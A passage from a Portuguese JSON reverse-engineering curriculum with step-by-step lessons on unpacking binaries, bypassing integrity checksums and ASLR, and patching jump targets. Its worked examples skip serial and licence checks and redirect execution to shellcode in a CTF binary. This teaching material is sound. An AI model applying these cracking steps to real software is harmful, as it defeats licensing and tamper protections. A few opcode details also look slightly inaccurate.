                                  "stepNumber": 1,
                                  "title": "Identificar Proteções Anti-Patching em Binários",
                                  "subSteps": [
                                    "Carregue o binário em uma ferramenta de análise estática como Ghidra ou IDA Free.",
                                    "Examine seções PE/ELF para signatures de packing (ex: UPX magic bytes em 0x10-0x20).",
                                    "Verifique checksums calculando hash MD5/SHA1 da seção .text e compare com valores hardcoded.",
                                    "Teste ASLR parcial executando o binário múltiplas vezes e observe endereços base via debugger.",
                                    "Anote proteções detectadas em um relatório."
                                  ],
                                  "verification": "Lista de proteções identificadas com evidências (screenshots ou logs).",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ghidra, strings.exe (Sysinternals), binário de teste packed (ex: sample UPX do VirusTotal).",
                                  "tips": "Use 'file' command no Linux para detecção rápida de packing.",
                                  "learningObjective": "Reconhecer checksums, packing e ASLR parcial em binários.",
                                  "commonMistakes": "Ignorar seções overlay ou confundir packing com ofuscação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desempacotar Binários com Unpackers Básicos",
                                  "subSteps": [
                                    "Confirme packing com 'upx -t arquivo.exe'.",
                                    "Execute 'upx -d arquivo.exe' para desempacotar se UPX confirmado.",
                                    "Para outros packers, use HyperUnpacker ou manual unpacking via debugger (breakpoint na API WriteProcessMemory).",
                                    "Valide integridade pós-desempacote comparando tamanhos e executando.",
                                    "Extraia OEP (Original Entry Point) usando plugin ScyllaHide em x64dbg."
                                  ],
                                  "verification": "Binário desempacotado executa sem crashes e tamanho reduzido.",
                                  "estimatedTime": "1 hora",
                                  "materials": "UPX tool, x64dbg, binário UPX-packed de teste.",
                                  "tips": "Sempre backup o original antes de unpack.",
                                  "learningObjective": "Aplicar unpackers para remover packing básico.",
                                  "commonMistakes": "Executar unpacker em packer customizado sem detecção prévia."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Contornar Checksums Recalculando Hashes",
                                  "subSteps": [
                                    "Localize rotina de checksum no disassembler (procure calls para CRC32 ou Adler32).",
                                    "Patch NOP as instruções de verificação temporariamente.",
                                    "Calcule novo hash da seção modificada usando Python (hashlib.md5).",
                                    "Injete o novo hash no local hardcoded via hex editor.",
                                    "Restaure jumps originais e teste execução."
                                  ],
                                  "verification": "Binário passa na verificação de integridade sem alertas.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Hex editor (HxD), Python com hashlib, Ghidra/x64dbg.",
                                  "tips": "Use script Python para automação: hash = hashlib.md5(secao).hexdigest()",
                                  "learningObjective": "Modificar e recalcular checksums para patching.",
                                  "commonMistakes": "Calcular hash da seção errada (incluir/excluir headers)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Lidar com ASLR Parcial e Aplicar Patch Final",
                                  "subSteps": [
                                    "Identifique ASLR parcial (ex: DLLs fixas via /DYNAMICBASE:NO).",
                                    "Force base address fixo com debugger ou edit PE header (ImageBase).",
                                    "Aplique patch desejado (ex: NOP em anti-debug check).",
                                    "Teste em ambiente sandboxed para estabilidade.",
                                    "Gere relatório com before/after diffs."
                                  ],
                                  "verification": "Binário patched executa corretamente com ASLR desabilitado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "x64dbg, CFF Explorer (PE editor), binário com ASLR parcial.",
                                  "tips": "Use !aslr em WinDbg para status ASLR.",
                                  "learningObjective": "Neutralizar ASLR parcial para patching estável.",
                                  "commonMistakes": "Não relocar pointers após mudança de base."
                                }
                              ],
                              "practicalExample": "Baixe um sample UPX-packed 'hello world' de GitHub repos de RE. Identifique UPX, desempacote com upx -d, patch 'hello' para 'pwned', recalcule checksum na string check, fixe ASLR via PE edit, e execute para ver 'pwned' printed.",
                              "finalVerifications": [
                                "Binário original e patched comparados via diff (strings e hashes).",
                                "Execução sem crashes ou alertas anti-patching.",
                                "Checksums validados manualmente.",
                                "ASLR bypass confirmado com múltiplas runs.",
                                "Patch funcional (ex: bypass login).",
                                "Relatório com steps documentados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de proteções (100% match).",
                                "Sucesso no unpacking sem corrupção.",
                                "Hash recalculado exato e injetado corretamente.",
                                "Estabilidade pós-patching em debugger.",
                                "Documentação clara de verificações.",
                                "Tempo dentro do estimado (±20%)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Entender hashes (MD5/CRC) e colisões.",
                                "Programação: Scripts Python para automação de cálculos.",
                                "Sistemas Operacionais: PE/ELF formats e loaders.",
                                "Análise de Malware: Técnicas de unpacking em threats reais."
                              ],
                              "realWorldApplication": "Em análise de malware, researchers unpackam samples para análise estática; em vulnerability research, patcham binários proprietários para testar exploits em CTFs ou pentests éticos."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.6.4",
                    "name": "Manipulação de Fluxo de Controle",
                    "description": "Alteração de saltos, chamadas e retornos para redirecionar a execução do programa.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.4.1",
                        "name": "Saltos Incondicionais e Condicionais",
                        "description": "Instruções de salto como JMP (incondicional), JE, JNE, JG (condicionais baseadas em flags de CPU) usadas para alterar o fluxo de execução em código assembly de 32 e 64 bits, permitindo redirecionar o programa para blocos alternativos de código.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.1.1",
                            "name": "Identificar instruções de salto em disassembly",
                            "description": "Usar ferramentas como objdump, Ghidra ou IDA Pro para localizar instruções JMP, JE, JNE em binários ELF/PE, analisando operandos relativos ou absolutos e dependências de flags (ZF, CF, SF).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Carregar Binário para Disassembly",
                                  "subSteps": [
                                    "Instale ou abra ferramentas como objdump (parte do binutils), Ghidra ou IDA Pro Free.",
                                    "Obtenha um binário de exemplo ELF (Linux) ou PE (Windows), como um 'hello world' compilado com saltos.",
                                    "Execute 'objdump -d binary.elf' no terminal ou importe o binário no Ghidra/IDA Pro.",
                                    "Navegue para a seção .text ou código principal no disassembly gerado.",
                                    "Ajuste configurações para arquitetura x86/64 se necessário."
                                  ],
                                  "verification": "O disassembly é exibido corretamente com instruções legíveis em assembly x86.",
                                  "estimatedTime": "15 minutes",
                                  "materials": [
                                    "objdump ou Ghidra/IDA Pro",
                                    "Binário ELF/PE de exemplo (ex: gcc -o sample sample.c)",
                                    "Terminal ou IDE de RE"
                                  ],
                                  "tips": "Comece com binários estáticos e sem stripping para facilitar a análise inicial.",
                                  "learningObjective": "Preparar um ambiente funcional para inspeção de código binário.",
                                  "commonMistakes": [
                                    "Usar binário dinâmico sem símbolos",
                                    "Ignorar endianness ou arquitetura errada",
                                    "Não verificar integridade do binário com 'file' ou 'readelf'"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar Instruções de Salto no Disassembly",
                                  "subSteps": [
                                    "Procure visualmente ou use função de busca (Ctrl+F no Ghidra/IDA) por 'jmp', 'je', 'jne', 'ja', 'jb'.",
                                    "Identifique saltos incondicionais (jmp) e condicionais (je para ZF=1, jne para ZF=0).",
                                    "Anote endereços de instruções de salto e seus alvos aproximados.",
                                    "Destaque padrões como loops (salto para trás) ou branches (salto para frente).",
                                    "Use navegação cross-reference (xrefs) para ver quem chama o salto."
                                  ],
                                  "verification": "Lista de pelo menos 5 instruções de salto identificadas com endereços e tipos anotados.",
                                  "estimatedTime": "20 minutes",
                                  "materials": [
                                    "Ferramenta de disassembly ativa",
                                    "Binário carregado"
                                  ],
                                  "tips": "Filtre por opcode 0xEB para short jmp ou 0xE9 para near jmp em hex view.",
                                  "learningObjective": "Desenvolver habilidade em scanning rápido de disassembly para fluxos de controle.",
                                  "commonMistakes": [
                                    "Confundir call/ret com jmp",
                                    "Ignorar saltos indiretos como jmp [reg]",
                                    "Não notar saltos nulos ou padding"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Operandos Relativos e Absolutos dos Saltos",
                                  "subSteps": [
                                    "Classifique operandos: relativos (ex: jmp +0x10) vs absolutos (jmp 0x401000).",
                                    "Calcule alvos: endereço atual + offset relativo para prever destino.",
                                    "Verifique se o alvo é uma label, endereço fixo ou registro (jmp rax).",
                                    "Use calculadora hex para validar offsets (ex: 0x100 + 0xA = 0x10A).",
                                    "Trace dependências: saltos condicionais após CMP/TEST que setam flags."
                                  ],
                                  "verification": "Para cada salto identificado, anote tipo de operando, cálculo de alvo e destino real.",
                                  "estimatedTime": "25 minutes",
                                  "materials": [
                                    "Disassembly anotado",
                                    "Calculadora hexadecimal (ex: Windows Calc ou online)"
                                  ],
                                  "tips": "Em Ghidra, clique direito no operando para 'Go To' e valide o destino.",
                                  "learningObjective": "Compreender mecânica de endereçamento em instruções de salto.",
                                  "commonMistakes": [
                                    "Erro em sinal de offset relativo (sempre signed)",
                                    "Confundir RVA com VA absoluta",
                                    "Não ajustar por ASLR em PE"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Examinar Dependências de Flags em Saltos Condicionais",
                                  "subSteps": [
                                    "Identifique flags relevantes: ZF para je/jne, CF para jb/ja, SF para jge/jl.",
                                    "Trace instruções anteriores: CMP set ZF/CF/SF, TEST para ZF/SF.",
                                    "Anote sequência: ex: cmp eax,0; je label (salta se equal, ZF=1).",
                                    "Simule execução manualmente para 2-3 saltos, prevendo branch taken/not taken.",
                                    "Use debugger como GDB (gdb -q binary; disassemble main) para validar flags em runtime."
                                  ],
                                  "verification": "Diagrama de fluxo com 3 saltos condicionais mostrando flags e condições.",
                                  "estimatedTime": "20 minutes",
                                  "materials": [
                                    "GDB ou debugger integrado no Ghidra/IDA",
                                    "Disassembly com anotações"
                                  ],
                                  "tips": "Lembre: je = ZF=1, jne=ZF=0; múltiplas flags em JS/JNS (SF).",
                                  "learningObjective": "Analisar lógica condicional baseada em flags do processador.",
                                  "commonMistakes": [
                                    "Atribuir flags erradas (ex: je não é só ==)",
                                    "Ignorar carry em unsigned branches",
                                    "Não considerar overflow em SF/OF"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ELF simples (gcc -static -no-pie -o check_pass check.c), objdump mostra: 401200: cmp $0x1,%eax; 401203: je 401210 <success>; 401205: jmp 401220 <fail>. Aqui, je usa ZF de cmp (salta se eax==1), jmp é incondicional relativo +0x1A.",
                              "finalVerifications": [
                                "Pode disassemble um binário e listar todos jmp/je/jne com alvos calculados.",
                                "Explica dependência de flags para 3 saltos condicionais diferentes.",
                                "Valida alvos de saltos relativos/absolutos sem erros de cálculo.",
                                "Identifica padrões de loop/branch em disassembly real.",
                                "Simula execução de fluxo de controle em debugger.",
                                "Diferencia saltos diretos/indiretos corretamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de 90%+ das instruções de salto.",
                                "Cálculos corretos de offsets e alvos em todos os exemplos.",
                                "Explicação clara de flags (ZF/CF/SF) com exemplos contextualizados.",
                                "Uso adequado de ferramentas sem erros de configuração.",
                                "Análise de pelo menos um binário PE e um ELF.",
                                "Diagrama de fluxo coerente demonstrando compreensão."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entendimento de pipeline e flags do x86.",
                                "Linguagem Assembly: Sintaxe e semântica de instruções de controle.",
                                "Segurança Computacional: Detecção de ROP chains via saltos.",
                                "Programação de Sistemas: Comportamento de binários em runtime.",
                                "Análise de Malware: Desofuscação de fluxos de controle."
                              ],
                              "realWorldApplication": "Na engenharia reversa de malware, identificar saltos permite mapear lógica anti-debugging (ex: jne skip_decrypt se debugger detectado), ou em auditoria de firmware para encontrar backdoors via branches condicionais baseados em senhas hardcodadas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.4.1.2",
                            "name": "Modificar endereço de destino de saltos",
                            "description": "Alterar bytes do opcode ou operando em um binário usando hex editor ou patchers, calculando offsets corretos para 32/64 bits, e preservando alinhamento para evitar crashes.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e analisar o binário inicial",
                                  "subSteps": [
                                    "Instale um hex editor como HxD ou 010 Editor e um disassembler como IDA Free ou Ghidra.",
                                    "Carregue o binário alvo e identifique a arquitetura (32-bit ou 64-bit) usando ferramentas como file ou readelf.",
                                    "Execute o binário em um debugger como x64dbg ou GDB para observar o fluxo de execução normal.",
                                    "Anote os endereços de funções ou blocos relevantes usando o disassembler.",
                                    "Crie um backup do binário original para evitar perda de dados."
                                  ],
                                  "verification": "Confirme que o binário executa sem crashes no debugger e que a arquitetura está corretamente identificada.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Hex editor (HxD), Disassembler (Ghidra/IDA), Debugger (x64dbg/GDB), Binário de teste simples (ex: hello world com saltos)"
                                  ],
                                  "tips": "Use um ambiente virtualizado (VM) para isolar testes e evitar impactos no sistema host.",
                                  "learningObjective": "Configurar ferramentas essenciais para manipulação segura de binários.",
                                  "commonMistakes": [
                                    "Executar binários desconhecidos sem sandbox",
                                    "Confundir 32-bit com 64-bit levando a offsets errados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar o opcode de salto e seu operando atual",
                                  "subSteps": [
                                    "No disassembler, procure por instruções de salto como JMP (0xEB, 0xE9, 0xFF), JZ, JNZ etc.",
                                    "Anote o endereço virtual (VA) do opcode e o offset relativo ou absoluto do operando.",
                                    "Calcule o endereço de destino atual: destino = endereço_do_salto + tamanho_do_opcode + operando.",
                                    "Marque o salto no hex editor pelo offset raw correspondente ao VA.",
                                    "Verifique o alinhamento atual (geralmente múltiplos de 4 ou 8 bytes em x86/x64)."
                                  ],
                                  "verification": "Disassemble o salto e confirme que o destino calculado leva ao bloco correto no debugger.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Disassembler, Hex editor, Debugger"
                                  ],
                                  "tips": "Use busca por padrões de bytes (ex: E9 para JMP near) para acelerar a localização.",
                                  "learningObjective": "Identificar precisamente saltos em código assembly desmontado.",
                                  "commonMistakes": [
                                    "Ignorar o tamanho do opcode (rel8=1byte, rel32=4bytes)",
                                    "Confundir offsets relativos com absolutos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular o novo offset de destino",
                                  "subSteps": [
                                    "Escolha o novo destino (ex: pular uma checagem de licença) e anote seu endereço VA.",
                                    "Para saltos relativos: novo_offset = novo_VA - (VA_salto + tamanho_opcode + tamanho_operando).",
                                    "Ajuste para 32/64 bits: use signed extension para rel8/rel32; converta para little-endian.",
                                    "Verifique limites: rel8 (-128 a +127), rel32 (±2GB); mude opcode se necessário (ex: EB para E9).",
                                    "Confirme preservação de alinhamento somando padding se preciso (NOPs 0x90)."
                                  ],
                                  "verification": "Some o novo offset ao endereço do salto no debugger para confirmar chegada ao destino pretendido.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Calculadora hexadecimal (ex: online hex calc), Notas de endereços"
                                  ],
                                  "tips": "Use Python script simples para cálculos: offset = (target - (rip + instr_len)) & 0xFFFFFFFF.",
                                  "learningObjective": "Dominar aritmética de offsets relativos em diferentes arquiteturas.",
                                  "commonMistakes": [
                                    "Erro de sinal em offsets negativos",
                                    "Não converter para little-endian ao editar bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar a modificação no hex editor",
                                  "subSteps": [
                                    "Abra o binário no hex editor e navegue ao offset raw do operando do salto.",
                                    "Substitua os bytes do operando pelo novo offset em little-endian (ex: 0x12345678 -> 78 56 34 12).",
                                    "Se necessário, altere o opcode (ex: de EB para E9) e adicione NOPs para alinhamento.",
                                    "Salve como novo arquivo e recalcule checksums se aplicável (ex: PE headers).",
                                    "Reabra no disassembler para validar a mudança."
                                  ],
                                  "verification": "O disassembler mostra o novo destino correto sem warnings de desalinhamento.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Hex editor"
                                  ],
                                  "tips": "Edite apenas bytes necessários; use 'replace' para padrões exatos.",
                                  "learningObjective": "Editar binários diretamente com precisão byte-a-byte.",
                                  "commonMistakes": [
                                    "Sobrescrever bytes adjacentes",
                                    "Esquecer little-endian"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e depurar a modificação",
                                  "subSteps": [
                                    "Execute o binário modificado no debugger e defina breakpoint no salto.",
                                    "Single-step (F7/F8) para confirmar desvio ao novo destino sem crashes.",
                                    "Monitore stack/registers para detecção de desalinhamento ou exceções.",
                                    "Teste cenários edge: loops, condições booleanas afetadas pelo salto.",
                                    "Compare comportamento original vs modificado com ferramentas como strace ou ProcMon."
                                  ],
                                  "verification": "Binário executa funcionalmente, salto redireciona corretamente sem AVs ou crashes.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Debugger, Ferramentas de tracing (strace/ProcMon)"
                                  ],
                                  "tips": "Use breakpoints condicionais para saltos repetidos.",
                                  "learningObjective": "Validar modificações em runtime evitando artefatos de depuração.",
                                  "commonMistakes": [
                                    "Testar sem debugger levando a crashes silenciosos",
                                    "Ignorar ASLR/DEP"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um crackme.exe 32-bit, localize JNZ 0x401050 no offset 0x1234 (opcode EB 10). Calcule novo offset para pular checagem de serial (destino 0x401100): offset = 0x401100 - (0x401040 + 2) = 0xC0. Mude para E9 C0 00 00 00 (JMP rel32). Adicione NOPs para alinhamento. Teste: programa aceita qualquer serial sem crash.",
                              "finalVerifications": [
                                "Calcula corretamente offsets para saltos rel8/rel32 em 32/64 bits.",
                                "Edita bytes em hex editor sem corromper estrutura do binário.",
                                "Preserva alinhamento e evita crashes em execução.",
                                "Valida mudança via disassembler e debugger.",
                                "Aplica padding (NOPs) quando necessário.",
                                "Diferencia saltos relativos de absolutos."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo de offsets (erro <1 byte).",
                                "Binário modificado executa sem crashes ou warnings.",
                                "Desvio de fluxo confirmado em pelo menos 3 execuções.",
                                "Documentação clara de mudanças (offsets antes/depois).",
                                "Manipulação correta de endianness e signed values.",
                                "Tempo total dentro de 2 horas para exemplo completo."
                              ],
                              "crossCurricularConnections": [
                                "Programação Assembly: Entender opcodes e operandos.",
                                "Debugging e Análise de Malware: Técnicas de patching.",
                                "Matemática Computacional: Aritmética modular e hex.",
                                "Sistemas Operacionais: PE/ELF formats e carregamento.",
                                "Segurança de Software: Bypass de controles de fluxo."
                              ],
                              "realWorldApplication": "Em análise de malware, redirecionar saltos para neutralizar chamadas maliciosas; em patching de software legado, corrigir bugs de fluxo; em CTFs/pentesters, explorar binários para bypass de proteções como anti-debugging."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.1.1"
                            ]
                          },
                          {
                            "id": "10.1.6.4.1.3",
                            "name": "Testar e validar redirecionamento de fluxo via saltos",
                            "description": "Executar o binário modificado em debugger como GDB ou x64dbg, verificando se o salto redireciona corretamente o IP/RIP, analisando impacto em buffer overflows ou lógica condicional.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o Ambiente de Debug e Carregar o Binário",
                                  "subSteps": [
                                    "Instalar e iniciar o debugger (GDB para Linux ou x64dbg para Windows).",
                                    "Carregar o binário modificado usando 'file' no GDB ou 'Open' no x64dbg.",
                                    "Executar 'disassemble' ou visualizar disassembly para localizar o salto modificado.",
                                    "Verificar a arquitetura (x86/x64) e modo de execução (32/64-bit).",
                                    "Salvar o estado inicial do programa para resets rápidos."
                                  ],
                                  "verification": "O binário carrega sem erros, disassembly exibe o opcode de salto alterado (ex: jmp 0xdeadbeef).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GDB ou x64dbg instalado",
                                    "Binário modificado com salto patchado",
                                    "Terminal ou IDE de debug"
                                  ],
                                  "tips": [
                                    "Use 'gdb -q' para modo quieto; ative ASLR off com 'set disable-randomization on' no GDB."
                                  ],
                                  "learningObjective": "Estabelecer um ambiente de debug estável e reproduzível para análise de binários.",
                                  "commonMistakes": [
                                    "Ignorar mismatch de arquitetura causando crash",
                                    "Carregar binário sem privilégios adequados",
                                    "Não desabilitar proteções como ASLR inicialmente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Configurar Breakpoints no Salto",
                                  "subSteps": [
                                    "Navegar até a função ou bloco contendo o salto via 'disassemble main' ou busca por opcode.",
                                    "Identificar endereços exatos do salto incondicional/condicional (ex: 0x401000) e destino.",
                                    "Definir breakpoints: 'break *0x401000' no salto, 'break *0x401100' no destino, e um no entry point.",
                                    "Listar e confirmar breakpoints com 'info breakpoints' ou na UI do debugger.",
                                    "Preparar input que acione o fluxo (ex: buffer overflow payload)."
                                  ],
                                  "verification": "Breakpoints ativados corretamente e listados sem erros de endereço inválido.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Mesmos do Step 1",
                                    "Payload de teste para trigger (ex: Python script gerador)"
                                  ],
                                  "tips": [
                                    "Use nomes de símbolos se disponíveis ('break function_name+offset'); priorize hardware breakpoints para saltos."
                                  ],
                                  "learningObjective": "Dominar colocação precisa de breakpoints para isolar eventos de controle de fluxo.",
                                  "commonMistakes": [
                                    "Breakpoint em endereço errado causando skip",
                                    "Não considerar saltos condicionais (testar JE/JNE)",
                                    "Esquecer breakpoint no destino para confirmação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar o Programa e Monitorar Redirecionamento do IP/RIP",
                                  "subSteps": [
                                    "Executar com 'run < input.txt' ou fornecer args/payload via UI.",
                                    "Pausar no primeiro breakpoint (entry/salto) e examinar registradores ('info registers' ou watch RIP).",
                                    "Single-step ('si' ou step-into) através do salto e registrar IP/RIP antes/depois.",
                                    "Continuar ('c') até destino e confirmar desvio via stack trace ou disassembly.",
                                    "Repetir com input sem trigger para comparar fluxo original."
                                  ],
                                  "verification": "RIP/IP altera para endereço de destino pretendido após salto, sem crash ou loop.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Payloads de teste variados",
                                    "Notepad para registrar valores de registradores"
                                  ],
                                  "tips": [
                                    "Watch RIP dinamicamente com 'watch $rip'; use 'x/i $rip' para disassemble atual."
                                  ],
                                  "learningObjective": "Observar e validar dinamicamente mudanças no Instruction Pointer durante execução.",
                                  "commonMistakes": [
                                    "Não pausar exatamente no salto",
                                    "Confundir EIP (32-bit) com RIP (64-bit)",
                                    "Ignorar side-effects como flags alteradas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impacto e Validar Resultados do Redirecionamento",
                                  "subSteps": [
                                    "Trace pós-salto para impactos (ex: bypass de check de buffer ou condicional).",
                                    "Simular buffer overflow: injetar payload e verificar se salto mitiga/explora.",
                                    "Comparar outputs/behaviors com binário original (ex: sucesso sem auth).",
                                    "Documentar: screenshot de registers, log de execução, diff de fluxos.",
                                    "Testar edge cases: saltos condicionais falhando/sucedendo."
                                  ],
                                  "verification": "Comportamento alterado confirmado (ex: shell spawn ou bypass), logs documentados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário original para comparação",
                                    "Ferramentas como diff ou Wireshark se network",
                                    "Screenshot tool"
                                  ],
                                  "tips": [
                                    "Grave sessão com 'script' no GDB; teste com valgrind para leaks adicionais."
                                  ],
                                  "learningObjective": "Avaliar efeitos sistêmicos de manipulação de fluxo em vulnerabilidades reais.",
                                  "commonMistakes": [
                                    "Focar só no salto ignorando chain de eventos",
                                    "Não testar cenários sem modificação",
                                    "Documentação incompleta para reprodutibilidade"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário CTF vulnerável a buffer overflow (ex: 'vuln'), patch jmp 0x401020 para 0x401500 (shellcode). No GDB: run com payload AAAA...%n, observe RIP -> 0x401500, bypass check de senha, ganhe shell confirmando exploit via salto.",
                              "finalVerifications": [
                                "Configura debugger e breakpoints sem erros em <5 min.",
                                "Monitora e relata mudança exata de RIP/IP com evidência.",
                                "Identifica e explica impacto em buffer overflow ou condicional.",
                                "Documenta sessão completa com screenshots/logs reproduzíveis.",
                                "Testa e diferencia fluxos original vs. modificado.",
                                "Manipula saltos condicionais (JE/JNE) corretamente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de breakpoints e observação de RIP (100% match).",
                                "Análise profunda de impacto com evidências concretas (ex: bypass comprovado).",
                                "Tempo de execução eficiente (<90 min total) com zero crashes auto-induzidos.",
                                "Documentação clara e reproduzível para auditoria.",
                                "Tratamento de edge cases (condicionais, overflows) sem orientação.",
                                "Conexão explícita entre salto e vulnerabilidade real."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Entender opcodes de salto (JMP, JE, CALL).",
                                "Sistemas Operacionais: Gerenciamento de memória e registradores (EIP/RIP).",
                                "Testes de Software: Técnicas de debugging e tracing de execução.",
                                "Redes e Segurança: Exploração em pentests e análise de malware."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, validar se atacantes patcharam saltos para desabilitar AV checks; em ethical hacking/CTFs, confirmar exploits de ROP/overflow via redirecionamento de fluxo para shellcode."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.4.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.4.2",
                        "name": "Manipulação de Chamadas de Função (CALL)",
                        "description": "Instruções CALL que salvam o endereço de retorno na pilha e transferem controle para funções, permitindo injeção ou redirecionamento para shellcodes ou gadgets em ROP.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.4.2.1",
                            "name": "Analisar pilha de chamadas em assembly",
                            "description": "Desmontar sequências CALL em binários, rastreando push de parâmetros e alinhamento da pilha em x86/x64, identificando funções importadas em ELF/PE via seções .plt ou IAT.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Fundamentos da Pilha e Convenções de Chamada em x86/x64",
                                  "subSteps": [
                                    "Estude a estrutura da pilha: RSP (stack pointer) em x64, ESP em x86, e uso de RBP/EBP como frame pointer.",
                                    "Aprenda convenções de chamada: System V ABI para Linux x64 (parâmetros em registradores primeiro, depois pilha alinhada a 16 bytes), Microsoft x64 para Windows.",
                                    "Identifique instruções chave: PUSH, POP, CALL (empurra EIP/RIP), RET (pop e jump).",
                                    "Revise alinhamento da pilha: obrigatório 16 bytes em x64 antes de CALL.",
                                    "Pratique visualizando diagramas de pilha antes/depois de CALL."
                                  ],
                                  "verification": "Desenhe manualmente um diagrama da pilha para uma chamada simples com 3 parâmetros e confirme alinhamento.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documentação Intel x86/x64 manuals (Vol. 1)",
                                    "Diagramas de pilha online (ex: felixcloutier.com)",
                                    "Ferramenta de desenho como draw.io"
                                  ],
                                  "tips": [
                                    "Lembre-se: parâmetros são empilhados da direita para esquerda em convenções como cdecl.",
                                    "Use GDB para observar RSP durante execução."
                                  ],
                                  "learningObjective": "Compreender como a pilha gerencia parâmetros e retorno em chamadas de função.",
                                  "commonMistakes": [
                                    "Confundir ordem de empilhamento (direita-esquerda).",
                                    "Ignorar alinhamento de 16 bytes em x64.",
                                    "Esquecer que CALL empurra o endereço de retorno."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Desmontar Binários e Identificar Sequências CALL",
                                  "subSteps": [
                                    "Compile um binário simples em C (ex: com printf) usando gcc -m64 -no-pie -O0.",
                                    "Use objdump -d ou radare2 (r2 binary; aaa; pdf) para desmontar e localizar instruções CALL.",
                                    "Diferencie CALL direto (endereço fixo) de indireto (via registrador ou .plt/IAT).",
                                    "Anote endereços de CALL e funções-alvo.",
                                    "Use readelf -r ou dumpbin /imports para ver relocações iniciais."
                                  ],
                                  "verification": "Liste todas as CALLs em um binário simples e identifique pelo menos 3 tipos diferentes.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GCC compiler",
                                    "objdump/readelf (binutils)",
                                    "radare2 ou Ghidra gratuito",
                                    "Binário de exemplo: echo 'int main(){printf(\"hi\");}' | gcc -x c - -o test"
                                  ],
                                  "tips": [
                                    "Ative -fno-pie para endereços absolutos fáceis.",
                                    "Em radare2, 's sym.main; pdf' foca na main."
                                  ],
                                  "learningObjective": "Localizar e classificar instruções CALL em código desmontado.",
                                  "commonMistakes": [
                                    "Confundir CALL com JMP.",
                                    "Não desabilitar otimizações (-O0) que inline funções.",
                                    "Ignorar seções como .text para CALLs."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Rastrear Push de Parâmetros e Alinhamento da Pilha",
                                  "subSteps": [
                                    "Antes de cada CALL, trace instruções PUSH ou MOV para pilha nos 20-30 bytes anteriores.",
                                    "Calcule offsets: parâmetros em [RSP+8], [RSP+16], etc., após shadow space (32 bytes em MS x64).",
                                    "Verifique alinhamento: sub rsp, X para ajustar antes de CALL.",
                                    "Simule a pilha em papel ou debugger: anote valores empilhados e RSP changes.",
                                    "Use GDB: 'break *main+offset; run; x/10gx $rsp' para inspecionar pilha."
                                  ],
                                  "verification": "Para uma CALL com 4 parâmetros, liste valores empilhados, offsets e confirme alinhamento pós-CALL.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "GDB ou WinDbg",
                                    "Binário com múltiplos parâmetros (ex: soma de 4 ints)",
                                    "Calculadora hexadecimal para offsets"
                                  ],
                                  "tips": [
                                    "Siga o fluxo reverso: do CALL para trás até MOV/PUSH.",
                                    "Em x64 Linux, primeiros 6 params em RDI,RSI,etc."
                                  ],
                                  "learningObjective": "Mapear parâmetros na pilha durante chamadas de função.",
                                  "commonMistakes": [
